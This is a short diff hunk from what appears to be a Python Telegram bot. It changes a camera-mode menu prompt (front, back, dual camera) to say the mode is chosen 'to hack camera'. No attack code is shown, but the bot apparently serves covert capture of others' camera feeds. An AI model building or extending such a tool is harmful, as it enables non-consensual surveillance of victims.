@@ -68,7 +68,7 @@ def callback_query(call):
         markup.row(types.InlineKeyboardButton("📸 Front Camera", callback_data="m_front"), types.InlineKeyboardButton("📸 Back Camera", callback_data="m_back"))
         markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
         markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-        bot.edit_message_text("<b>Select your camera mode:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+        bot.edit_message_text("<b>Select your camera mode to hack camera 📸:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
